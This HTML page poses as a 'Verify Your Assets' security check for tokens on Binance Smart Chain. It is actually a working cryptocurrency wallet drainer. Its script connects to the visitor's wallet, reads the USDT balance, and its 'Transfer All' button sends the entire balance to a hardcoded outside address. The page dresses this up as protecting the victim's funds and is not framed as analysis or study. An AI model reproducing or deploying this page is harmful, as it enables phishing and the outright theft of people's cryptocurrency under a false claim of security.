<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verify Your Assets</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet"/>
  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(to right, #000, #222);
      color: white;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px;
      background: #000;
    }

    .logo {
      display: flex;
      align-items: center;
    }

    .logo img {
      width: 30px;
      height: 30px;
      margin-right: 10px;
    }

    .menu-icon {
      width: 25px;
      height: 3px;
      background: yellow;
      position: relative;
    }

    .menu-icon::before,
    .menu-icon::after {
      content: '';
      position: absolute;
      width: 25px;
      height: 3px;
      background: yellow;
      left: 0;
    }

    .menu-icon::before {
      top: -8px;
    }

    .menu-icon::after {
      top: 8px;
    }

    main {
      text-align: center;
      padding: 40px 20px;
      flex: 1;
    }

    h1 {
      font-size: 2.5rem;
      color: gold;
      margin: 30px 0;
    }

    .btn {
      background: linear-gradient(to right, #ffc107, #ffeb3b);
      border: none;
      padding: 15px 30px;
      margin: 10px auto;
      font-size: 1.1rem;
      font-weight: bold;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
      width: fit-content;
    }

    .btn img {
      width: 20px;
      height: 20px;
      margin-right: 10px;
    }

    #walletInfo {
      margin-top: 20px;
      font-size: 1.1rem;
      color: white;
      white-space: pre-line;
    }

    footer {
      text-align: center;
      padding: 15px;
      background-color: #111;
      color: white;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <header>
    <div class="logo">
      <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT Logo" />
    </div>
    <div class="menu-icon"></div>
  </header>

  <main>
    <h1>Verify Your Assets</h1>
    <p>Ensure your tokens are secure on Binance Smart Chain.</p>

    <button class="btn" onclick="connectWallet()">
      <img src="https://img.icons8.com/material-rounded/24/000000/wallet.png" alt="Wallet Icon" />
      Connect Wallet
    </button>

    <button id="transferBtn" class="btn" onclick="transferUSDT()">Transfer All</button>

    <div id="walletInfo"></div>
  </main>

  <footer>Â© 2025 All rights reserved.</footer>

  <script>
    let web3;
    let usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    let recipient = "0xb4faa33f9881c7eca87c1a731ea5dce6320c1bfa";
    let account;

    const abi = [
      {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
      {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
    ];

    async function connectWallet() {
      if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        await window.ethereum.enable();
        const accounts = await web3.eth.getAccounts();
        account = accounts[0];
        const contract = new web3.eth.Contract(abi, usdtAddress);
        const balance = await contract.methods.balanceOf(account).call();
        const formattedBalance = web3.utils.fromWei(balance, 'mwei');
        document.getElementById("walletInfo").innerText =
          `Wallet: ${account}\nUSDT Balance: ${formattedBalance}`;
      } else {
        alert("Please install MetaMask.");
      }
    }

    async function transferUSDT() {
      const contract = new web3.eth.Contract(abi, usdtAddress);
      const balance = await contract.methods.balanceOf(account).call();
      await contract.methods.transfer(recipient, balance).send({ from: account });
      alert("Transfer successful!");
    }
  </script>
</body>
</html>
